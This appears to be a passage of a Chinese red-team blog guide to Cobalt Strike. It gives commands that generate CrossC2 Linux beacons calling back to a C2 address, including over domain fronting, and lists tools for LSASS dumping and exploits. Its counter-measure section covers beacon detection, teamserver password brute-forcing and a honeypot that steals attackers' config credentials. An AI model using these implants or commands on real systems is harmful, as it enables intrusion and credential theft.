+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/uknowsec/SharpToolsAggressor" >uknowsec&#x2F;SharpToolsAggressor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 内网渗透中常用的 c# 程序整合成 cs 脚本, 直接内存加载.</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/DeEpinGh0st/Erebus" >DeEpinGh0st&#x2F;Erebus <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> CobaltStrike 后渗透测试插件</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/EventLogMaster" >QAX-A-Team&#x2F;EventLogMaster <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - RDP 日志取证 &amp; 清除插件</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/outflanknl/Spray-AD" >outflanknl&#x2F;Spray-AD <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Cobalt Strike工具，用于审核 AD 用户帐户中的弱密码</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2" >gloxec&#x2F;CrossC2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - generate CobaltStrike’s cross-platform payload</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/lintstar/LSTAR" >lintstar&#x2F;LSTAR <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - LSTAR - CobaltStrike 综合后渗透插件</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/AttackTeamFamily/cobaltstrike-bof-toolset" >AttackTeamFamily&#x2F;cobaltstrike-bof-toolset <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 在cobaltstrike中使用的bof工具集，收集整理验证好用的bof。</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/outflanknl/PrintNightmare" >outflanknl&#x2F;PrintNightmare <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - CVE-2021-1675 &#x2F; CVE-2021-34527 exploit.</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/helpsystems/nanodump" >helpsystems&#x2F;nanodump <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Dumping LSASS has never been so stealthy</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/optiv/Registry-Recon" >optiv&#x2F;Registry-Recon <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Cobalt Strike Aggressor Script that Performs System&#x2F;AV&#x2F;EDR Recon</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/mgeeky/cobalt-arsenal" >mgeeky&#x2F;cobalt-arsenal <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - My collection of battle-tested Aggressor Scripts for Cobalt Strike 4.0+</li>
+</ul>
+<p>Cobalt Strike 可通过它的 Aggressor Script 语言来为其编写脚本。Aggressor Script 是 Armitage 的 Cortana 脚本语言的精神继任者，虽然这两者并不兼容。通过 Cobalt Strike → Script Manager 来对脚本进行管理。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081609692.png"
+                     
+                ></p>
+<h3 id="CrossC2上线Linux"><a href="#CrossC2上线Linux" class="headerlink" title="CrossC2上线Linux"></a>CrossC2上线Linux</h3><p>地址 : <a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2" >https://github.com/gloxec/CrossC2 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>下载 CrossC2.cna ,和相应平台的二进制文件,先修改 CrossC2.cna</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081610829.png"
+                     
+                ></p>
+<p>改为指定的文件路径</p>
+<p>选择 Script Manager，添加 CrossC2.cna</p>
+<p>起个 https 的监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081610830.png"
+                     
+                ></p>
+<p>将服务端的 .cobaltstrike.beacon_keys 文件拷到二进制文件目录下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081610832.png"
+                     
+                ></p>
+<p>生成</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081610831.png"
+                     
+                ></p>
+<p>也可以用命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genCrossC2.Win.exe 192.168.141.151 443 ./.cobaltstrike.beacon_keys null Linux x64 test</span><br></pre></td></tr></table></figure></div>
+
+<p>上传 test 文件至目标,加权限运行,目标上线</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081610844.png"
+                     
+                ></p>
+<p>参考文章</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://0x20h.com/p/c02f.html" >https://0x20h.com/p/c02f.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/micr067/p/13311206.html" >https://www.cnblogs.com/micr067/p/13311206.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="生成-rebind-库"><a href="#生成-rebind-库" class="headerlink" title="生成 rebind 库"></a>生成 rebind 库</h3><p>当 teamserver 配置了 c2profile 时，需要提前生成 rebind 库供生成 beacon 时使用</p>
+<p>参考官方的格式</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://gloxec.github.io/CrossC2/zh_cn/protocol/" >https://gloxec.github.io/CrossC2/zh_cn/protocol/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile" >https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/https.profile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c" >https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/c2profile.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/proxy_udp.py" >https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/proxy_udp.py <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/rebind_udp.c" >https://github.com/gloxec/CrossC2/blob/cs4.1/protocol_demo/rebind_udp.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>修改完毕后,测试 profile,编译生成</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./c2lint test.profile</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录 cs 生成 rebind 库供生成 beacon</span></span><br><span class="line">gcc test.c -fPIC -shared -o lib_rebind_test.so</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="直接生成-shell"><a href="#直接生成-shell" class="headerlink" title="直接生成 shell"></a>直接生成 shell</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录 cs 生成 shell</span></span><br><span class="line">./genCrossC2.Linux xx.xx.xx.xx 443 .cobaltstrike.beacon_keys null Linux x64 shell</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="域前置模式下生成-shell"><a href="#域前置模式下生成-shell" class="headerlink" title="域前置模式下生成 shell"></a>域前置模式下生成 shell</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 登录 cs 生成 shell</span></span><br><span class="line">./genCrossC2.Linux xx.xx.xx.xx 443 .cobaltstrike.beacon_keys ./lib_rebind_test.so Linux x64 shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意 mac m1 下生成的 shell , x86 运行上不了线</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="导入-cna"><a href="#导入-cna" class="headerlink" title="导入 cna"></a>导入 cna</h3><p>下载 <a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/releases/download/v3.1.0/CrossC2Kit-GithubBot-2022-06-07.zip" >https://github.com/gloxec/CrossC2/releases/download/v3.1.0/CrossC2Kit-GithubBot-2022-06-07.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>导入 CrossC2Kit_Loader.cna</p>
+<p><strong>注意</strong></p>
+<p>其实可以不用 CrossC2.cna 这个脚本, 直接在 cs 服务器的命令行下生成即可, 注意生成时候的回连地址, 如果是域前置要把域前置的 ip 指定，然后 host 头要在 profile 里指定，和 genCrossC2.Linux 没有关系</p>
+<p>如果还是上不了线,建议仔细看看这几个issue</p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/issues/60" >https://github.com/gloxec/CrossC2/issues/60 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/issues/89" >https://github.com/gloxec/CrossC2/issues/89 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/gloxec/CrossC2/issues/65" >https://github.com/gloxec/CrossC2/issues/65 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p>另外，mac m1 下生成的 shell ，x86 机器是用不了的，所以建议 cs 全套都在 x86 的机器上弄</p>
+<h3 id="Mac上线"><a href="#Mac上线" class="headerlink" title="Mac上线"></a>Mac上线</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ZptprvkNXRP0PNpmoXpbFg" >Macos钓鱼上线CS踩坑流程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h2 id="Blue-team-counter-蓝队反制"><a href="#Blue-team-counter-蓝队反制" class="headerlink" title="Blue team counter-蓝队反制"></a>Blue team counter-蓝队反制</h2><p>参考：</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2198190" >反制Cobaltstrike的那些手段 - 腾讯云开发者社区-腾讯云 (tencent.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Gamma_lab/article/details/123450852" >(96条消息) CS反制-CS服务器新特征_Gamma_lab的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.secpulse.com/archives/165561.html" >反击CobaltStrike（一） 以假乱真 - SecPulse.COM | 安全脉搏 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="服务端特征分析"><a href="#服务端特征分析" class="headerlink" title="服务端特征分析"></a>服务端特征分析</h3><p><strong>相关文章</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hNFVTRINKbBiOQiOf0WTMA" >CobaltStrike WebServer特征分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="beacon检测"><a href="#beacon检测" class="headerlink" title="beacon检测"></a>beacon检测</h3><p><strong>相关文章</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/211501" >Yara入门——如何通过Yara规则匹配CobaltStrike恶意样本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://decoded.avast.io/threatintel/decoding-cobalt-strike-understanding-payloads/" >Decoding Cobalt Strike: Understanding Payloads <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/D7mZTmL8DlqZ8YYYoygudw" >再探BeaconEye <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p><strong>相关工具</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/huoji120/CobaltStrikeDetected" >huoji120&#x2F;CobaltStrikeDetected <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 40 行代码检测到大部分 CobaltStrike 的 shellcode</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/CCob/BeaconEye" >CCob&#x2F;BeaconEye <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Hunts out CobaltStrike beacons and logs operator command output</li>
+</ul>
+<p><strong>检测规则</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/avast/ioc/tree/master/CobaltStrike" >https://github.com/avast/ioc/tree/master/CobaltStrike <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar" >https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p><strong>Hook Heap</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.arashparsa.com/hook-heaps-and-live-free/" >Hook Heaps and Live Free <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p><strong>Sleep Mask Kit</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://adamsvoboda.net/sleeping-with-a-mask-on-cobaltstrike/" >Sleeping with a Mask On (Cobalt Strike) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures" >Detecting Cobalt Strike with memory signatures <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="beacon分析"><a href="#beacon分析" class="headerlink" title="beacon分析"></a>beacon分析</h3><p>由于 beacon 中存在 C2 的信息,部分工具可以直接解析 beacon 中的 C2 信息,甚至模拟上线干扰服务器</p>
+<p><strong>相关工具</strong></p>
+<ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Sentinel-One/CobaltStrikeParser" >Sentinel-One&#x2F;CobaltStrikeParser <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Python parser for CobaltStrike Beacon’s configuration</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python parse_beacon_config.py beacon.exe</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://blog.didierstevens.com/2021/12/21/update-1768-py-version-0-0-11/" >https://blog.didierstevens.com/2021/12/21/update-1768-py-version-0-0-11/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - Beacon 进程 Dump 分析工具</p>
+</li>
+</ul>
+<h3 id="上线包干扰"><a href="#上线包干扰" class="headerlink" title="上线包干扰"></a>上线包干扰</h3><p><strong>相关工具</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/hariomenkel/CobaltSpam" >hariomenkel&#x2F;CobaltSpam <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - can be used to spam a CobaltStrike server with fake beacons</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/jas502n/CS_mock" >jas502n&#x2F;CS_mock <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 模拟cobalt strike beacon上线包.</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/LiAoRJ/CS_fakesubmit" >LiAoRJ&#x2F;CS_fakesubmit <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - 一个可以伪装上线Cobaltstrike的脚本</li>
+</ul>
+<h3 id="爆破-cobaltstrike-teamserver-密码"><a href="#爆破-cobaltstrike-teamserver-密码" class="headerlink" title="爆破 cobaltstrike teamserver 密码"></a>爆破 cobaltstrike teamserver 密码</h3><ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/ryanohoro/csbruter" >ryanohoro&#x2F;csbruter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ryanohoro/csbruter</span><br><span class="line"><span class="built_in">cd</span> csbruter</span><br><span class="line"><span class="built_in">cat</span> wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<h3 id="MySQL蜜罐读取配置文件"><a href="#MySQL蜜罐读取配置文件" class="headerlink" title="MySQL蜜罐读取配置文件"></a>MySQL蜜罐读取配置文件</h3><blockquote>
+<p>参考: <a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/i8eBT8O2IwCotf7wqnveEw" >https://mp.weixin.qq.com/s/i8eBT8O2IwCotf7wqnveEw <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<ol>
+<li><p>mysql 中的 load data local infile 函数能够读取本地文件到 mysql 数据库中。当攻击者用爆破 mysql 密码的扫描器扫描到我们的 mysql 并连接上的时候，客户端（攻击者）会自动发起一个查询，我们（服务端）会给与一个回应，我们在回应的数据包中加入 load data local infile 读取攻击者的本地文件到我们数据库中，达到反制的目的。</p>
+</li>
+<li><p>只要是使用 cs 客户端连接过 cs 服务端的电脑，cs 客户端都会在固定的文件夹下生成一个 <code>.aggressor.prop</code> 配置文件。如果是 Windows 系统，那么文件位置是：<code>C:\Users\Administrator\.aggressor.prop</code>，这个配置文件里面就包含了 cs 远控的 ip 地址、端口、用户名及密码，而且都是明文的.</p>
+</li>
+<li><p>搭建一个mysql蜜罐，一旦攻击者连接这个蜜罐，那么这个蜜罐利用msyql本地文件读取漏洞去自动读取 <code>C:\Users\Administrator\.aggressor.prop</code> 这个文件内容，蜜罐就可以成功得到攻击者的cs服务端ip地址、端口、用户名密码。</p>
+</li>
+</ol>
+<p>mac 的配置文件位置在 <code>~/.aggressor.prop</code></p>
+<h3 id="CVE-2022-39197"><a href="#CVE-2022-39197" class="headerlink" title="CVE-2022-39197"></a>CVE-2022-39197</h3><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/" >https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/TomAPU/poc_and_exp/tree/master/CVE-2022-39197" >https://github.com/TomAPU/poc_and_exp/tree/master/CVE-2022-39197 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vF7DPPCpr299ENudiFgDjQ" >CS4.5粗略预防CVE-2022-39197 XSS RCE <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ" >最新CS RCE曲折的复现路 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/89wXyPaSn3TYn4pmVdr-Mw" >CS RCE（CVE-2022-39197）复现心得分享 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/its-arun/CVE-2022-39197" >its-arun&#x2F;CVE-2022-39197 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://github.com/burpheart/CVE-2022-39197-patch" >burpheart&#x2F;CVE-2022-39197-patch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - CVE-2022-39197 漏洞补丁 在cobaltstrike启动参数中加入javaagent 启用补丁-javaagent:patch.jar</li>
+</ul>
+<h3 id="旁路反制"><a href="#旁路反制" class="headerlink" title="旁路反制"></a>旁路反制</h3><p>这个就比较泛泛而谈了，好比<a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/product/wpt?from=10680" >渗透测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>或者是rt打项目的时候，如果目标找不到利用点进去，就可以从旁站看看对吧，所以这种旁路反制亦是这样，我们发现一个c2上运行着cobaltstrike server了，然后上述的其他反制手段都行不通，这时我们就可以看看，这个c2上是不是还有其他的服务，我们对其端口进行扫描，获取相关信息，从其他服务的缺陷来实现反制，举个例子，很对rt或者攻击者在遇到weblogic、fastjson、log4j2等jndi漏洞的时候，要进行漏洞利用就得起rmi或者ldap，server，自己手动起是很麻烦的，所以网上会有很多的自动化工具，这对于攻击者来说是一个不错的选择。那么如果我们发现网上这类工具的一些rce了，就可以通过这个来反制。</p>
+<p>前段时间参加某次演习活动的时候，通过一些手段拿到了一个c2，对c2进行扫描后发现，其相关端口搭建的服务是nps的web控制端服务，所以后续就可以通过爆破该服务来实现反制，虽然后续爆破无果，后续的话正好当时nps是爆出来了个鉴权的漏洞，通过这个漏洞我们实现反制，拿到了攻击者的一些信息，以及其掌握的相关权限。</p>
+<p>总而言之，旁路反制的这个概念是非常广泛的，手段也是层出不朽的。在近些年的攻防的博弈中，防守方的防守体系已经逐渐体系成熟化，并且也逐渐开启了一些反制的号角，这里面蜜罐是最具有里程碑意义的。笔者认为一方攻一方守并不是所谓的攻防，攻防也者，应该是来回交战，攻中带防（攻击者要能掌握反反制手段），防中带攻（防守者要能抓住攻击者露出的马脚，进行反制），就和古代武侠比武一样。</p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本)</li>
+        <li>Post author：IcMl0x24</li>
+        <li>Create time：2023-03-14 20:13:23</li>
+        <li>
+            Post link：https://icml8.github.io/2023/03/14/cs/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/Cobalt-Strike/">#Cobalt Strike</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/03/14/shegong/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">黑与白的交锋-欺诈与反欺诈&amp;安全与威胁&amp;达摩克里斯之剑-社会工程学</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">红队攻击篇-Cobalt Strike帮助文档&amp;献给渗透测试人员的先进威胁战术(2023年2月9日更新版本)</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Introduce-%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">Introduce-介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E7%AB%A0%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.1.</span> <span class="nav-text">文章学习</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="nav-number">1.2.</span> <span class="nav-text">目录结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AA%E4%BA%BA%E5%AE%9A%E5%88%B6"><span class="nav-number">1.3.</span> <span class="nav-text">个人定制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E8%BF%90%E8%A1%8C"><span class="nav-number">1.4.</span> <span class="nav-text">启动运行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BF%BB%E8%AF%91%E5%8F%82%E8%80%83"><span class="nav-number">1.5.</span> <span class="nav-text">翻译参考</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Cobalt-Strike-%E9%92%B4%E5%85%83%E7%B4%A0%E6%89%93%E5%87%BB"><span class="nav-number">1.5.1.</span> <span class="nav-text">Cobalt Strike 钴元素打击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#View-%E8%A7%86%E5%9B%BE"><span class="nav-number">1.5.2.</span> <span class="nav-text">View 视图</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ATTacks-%E6%94%BB%E5%87%BB"><span class="nav-number">1.5.3.</span> <span class="nav-text">ATTacks 攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Packages-%E5%90%8E%E9%97%A8"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">Packages 后门</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Web-Drive-by"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">Web Drive-by</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Spear-Phish"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">Spear Phish</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#menu-%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95"><span class="nav-number">1.5.4.</span> <span class="nav-text">menu 右键菜单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Reporting-%E6%8A%A5%E5%91%8A"><span class="nav-number">1.5.5.</span> <span class="nav-text">Reporting 报告</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Help-%E5%B8%AE%E5%8A%A9"><span class="nav-number">1.5.6.</span> <span class="nav-text">Help 帮助</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Toolbar-%E5%B7%A5%E5%85%B7%E6%A0%8F"><span class="nav-number">1.5.7.</span> <span class="nav-text">Toolbar 工具栏</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Online-reminder-%E4%B8%8A%E7%BA%BF%E6%8F%90%E9%86%92"><span class="nav-number">1.5.8.</span> <span class="nav-text">Online reminder 上线提醒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#visualization-%E5%8F%AF%E8%A7%86%E5%8C%96"><span class="nav-number">1.5.9.</span> <span class="nav-text">visualization 可视化</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Listener-%E7%9B%91%E5%90%AC%E5%99%A8%E7%AD%96%E7%95%A5"><span class="nav-number">2.</span> <span class="nav-text">Listener-监听器策略</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.1.</span> <span class="nav-text">支持的协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E8%BD%AE%E5%9B%9E%E7%AD%96%E7%95%A5"><span class="nav-number">2.2.</span> <span class="nav-text">地址轮回策略</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attacks-%E6%A8%A1%E5%9D%97%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">Attacks-模块攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="nav-number">3.1.</span> <span class="nav-text">生成后门</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#HTA%E6%96%87%E6%A1%A3"><span class="nav-number">3.1.1.</span> <span class="nav-text">HTA文档</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 